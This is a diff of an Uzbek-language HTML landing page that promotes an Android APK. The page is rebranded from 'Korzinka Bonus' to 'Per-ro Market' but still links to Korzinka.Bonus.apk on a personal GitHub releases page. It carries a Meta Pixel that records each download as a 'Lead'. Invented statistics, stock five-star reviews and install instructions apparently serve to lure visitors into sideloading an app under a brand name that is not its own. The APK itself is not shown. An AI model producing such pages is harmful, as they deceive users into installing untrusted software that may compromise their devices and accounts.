@@ -3,29 +3,44 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Per-ro Market</title>
 
-<title>Korzinka Bonus</title>
-
-<!-- Meta Pixel Code -->
 <script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
+!function(f,b,e,v,n,t,s){
+if(f.fbq)return;
+
+n=f.fbq=function(){
+n.callMethod?
+n.callMethod.apply(n,arguments):
+n.queue.push(arguments)
+};
+
+if(!f._fbq)f._fbq=n;
+
+n.push=n;
+n.loaded=true;
+n.version='2.0';
+n.queue=[];
+
+t=b.createElement(e);
+t.async=true;
+t.src=v;
+
+s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s);
+
+}(window,document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '2491403044633394');
-fbq('track', 'PageView');
+
+fbq('init','2491403044633394');
+fbq('track','PageView');
+
+function trackDownload(){
+fbq('track','Lead');
+}
 </script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=2491403044633394&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
 
 <style>
-
 *{
 margin:0;
 padding:0;
@@ -34,9 +49,8 @@ font-family:Arial,sans-serif;
 }
 
 body{
-background:#f4f7f4;
+background:#f5f6f7;
 padding:20px;
-padding-bottom:100px;
 color:#1f2937;
 }
 
@@ -46,84 +60,64 @@ margin:auto;
 }
 
 .card{
-background:white;
-border-radius:30px;
-padding:25px;
-box-shadow:0 12px 35px rgba(0,0,0,.08);
-animation:fade .8s ease;
-}
-
-@keyframes fade{
-from{
-opacity:0;
-transform:translateY(20px)
-}
-to{
-opacity:1;
-transform:none
-}
+background:#fff;
+border-radius:28px;
+padding:24px;
+box-shadow:0 8px 30px rgba(0,0,0,.08);
 }
 
 .logo{
-width:95px;
-height:95px;
+width:90px;
+height:90px;
 display:block;
 margin:auto;
 margin-bottom:15px;
-border-radius:22px;
+border-radius:20px;
 object-fit:cover;
 }
 
 h1{
 text-align:center;
-margin-bottom:8px;
+margin-bottom:10px;
 }
 
 .subtitle{
 text-align:center;
-font-size:14px;
 color:#666;
-margin-bottom:20px;
+font-size:14px;
+margin-bottom:25px;
 }
 
-.stats{
+.info{
 display:flex;
 justify-content:space-between;
-margin-bottom:20px;
+margin-bottom:25px;
 text-align:center;
 }
 
-.stats div{
+.info div{
 flex:1;
 }
 
-.stats b{
+.info b{
 display:block;
-color:#e53935;
-font-size:20px;
+font-size:18px;
+margin-bottom:5px;
 }
 
-.badges{
+.features{
 display:flex;
+flex-wrap:wrap;
 gap:8px;
 justify-content:center;
-flex-wrap:wrap;
-margin-bottom:20px;
+margin-bottom:25px;
 }
 
-.badges span{
-background:#f1f5f1;
+.features span{
+background:#f3f4f6;
 padding:8px 12px;
 border-radius:20px;
 font-size:12px;
-}
-
-.banner{
-background:linear-gradient(135deg,#2e7d32,#43a047);
-padding:18px;
-border-radius:18px;
-color:white;
-margin-bottom:20px;
 }
 
 .download{
@@ -131,209 +125,131 @@ display:block;
 text-align:center;
 text-decoration:none;
 padding:16px;
-font-weight:bold;
-background:#e53935;
+background:#2e7d32;
 color:white;
 border-radius:18px;
-margin-top:15px;
-box-shadow:0 8px 25px rgba(229,57,53,.35);
+font-weight:bold;
+margin:20px 0;
 }
 
-.gallery{
-display:flex;
-gap:10px;
-overflow:auto;
-margin-top:15px;
-}
-
-.gallery img{
-width:150px;
-border-radius:16px;
-cursor:pointer;
+.section{
+margin-top:25px;
 }
 
 .review{
-margin-top:10px;
-padding:14px;
 background:#f7f7f7;
-border-radius:14px;
+padding:14px;
+border-radius:12px;
+margin-top:10px;
 }
 
 .faq{
 margin-top:10px;
 background:#f7f7f7;
 padding:14px;
-border-radius:14px;
+border-radius:12px;
 cursor:pointer;
 }
 
 .answer{
 display:none;
-padding-top:10px;
+margin-top:10px;
 color:#666;
 }
-
-.fixed{
-position:fixed;
-left:50%;
-transform:translateX(-50%);
-bottom:15px;
-width:90%;
-max-width:460px;
-}
-
 </style>
 
 <script>
-
-function openImg(src){
-const w=window.open("");
-w.document.write(
-'<img src="'+src+'" style="width:100%">'
-);
-}
-
 function faq(id){
-
 let x=document.getElementById(id);
 
 x.style.display=
 x.style.display==="block"
 ?"none"
 :"block";
-
 }
-
 </script>
 
 </head>
 
 <body>
-  
-<div class="container">
 
+<div class="container">
 <div class="card">
 
 <img src="logo.png" class="logo">
 
-<h1>Korzinka Bonus</h1>
+<h1>Per-ro Market</h1>
 
 <div class="subtitle">
-Mahsulotlar va bonus tizimi bir joyda
+Mahsulotlar va xizmatlar uchun mobil ilova
 </div>
 
-<div class="stats">
-
+<div class="info">
 <div>
-<b>500K+</b>
-<span>Foydalanuvchi</span>
+<b>Android</b>
+<span>Qo'llab-quvvatlanadi</span>
 </div>
 
 <div>
-<b>4.9★</b>
-<span>Reyting</span>
+<b>Mobil</b>
+<span>Qulay interfeys</span>
 </div>
 
 <div>
 <b>24/7</b>
-<span>Faol</span>
+<span>Mavjud</span>
+</div>
 </div>
 
-</div>
-
-<div class="badges">
-
-<span>🥦 Yangi mahsulotlar</span>
-<span>🎁 Bonuslar</span>
-<span>🚚 Tez xizmat</span>
-
-</div>
-
-<div class="banner">
-
-<h3>🎁 Maxsus bonus</h3>
-
-<p>
-Yangi foydalanuvchilar uchun chegirmalar va takliflar
-</p>
-
+<div class="features">
+<span>Mahsulotlar</span>
+<span>Katalog</span>
+<span>Qulay foydalanish</span>
 </div>
 
 <a class="download"
-href="https://github.com/KIQrst11/koryinlld/releases/download/v1.0/Korzinka.Bonus.apk"
-onclick="fbq('track','Lead')">
-
-⬇ Yuklab olish
-
+href="https://github.com/KIQrst11/Per-ro/releases/download/v1.0/Korzinka.Bonus.apk"
+onclick="trackDownload()">
+⬇ Ilovani yuklab olish
 </a>
 
-<h3 style="margin-top:25px">
-Ilova skrinshotlari
-</h3>
-
-<div class="gallery">
-
-<img src="assets/img1.png"
-onclick="openImg(this.src)">
-
-<img src="assets/img2.png"
-onclick="openImg(this.src)">
-
-<img src="assets/img3.png"
-onclick="openImg(this.src)">
-
-</div>
-
-<h3 style="margin-top:25px">
-Fikrlar
-</h3>
+<div class="section">
+<h3>Foydalanuvchi fikrlari</h3>
 
 <div class="review">
-★★★★★ Juda qulay foydalanish
+Qulay interfeys va oddiy foydalanish.
 </div>
 
 <div class="review">
-★★★★★ Tez ishlaydi
+Ilova tez ishlaydi.
+</div>
 </div>
 
-<div class="review">
-★★★★★ Interfeys juda yoqdi
-</div>
-
-<h3 style="margin-top:25px">
-FAQ
-</h3>
+<div class="section">
+<h3>FAQ</h3>
 
 <div class="faq" onclick="faq('a1')">
-Ilovani qanday o'rnataman?
+Ilova qanday o'rnatiladi?
+
 <div id="a1" class="answer">
-APK yuklab olib oching
+APK faylni yuklab olib o'rnatishni boshlang.
 </div>
+
 </div>
 
 <div class="faq" onclick="faq('a2')">
-Android ishlaydimi?
+Android qo'llab-quvvatlanadimi?
+
 <div id="a2" class="answer">
-Ha, Android qo'llab-quvvatlanadi
+Ha, Android qurilmalarida ishlaydi.
 </div>
-</div>
-
-</div>
-
-<div class="fixed">
-
-<a class="download"
-href="https://github.com/KIQrst11/koryinlld/releases/download/v1.0/Korzinka.Bonus.apk"
-onclick="fbq('track','Lead')">
-
-⬇ Yuklab olish
-
-</a>
 
 </div>
 
+</div>
+
+</div>
 </div>
 
 </body>
 </html>
-```
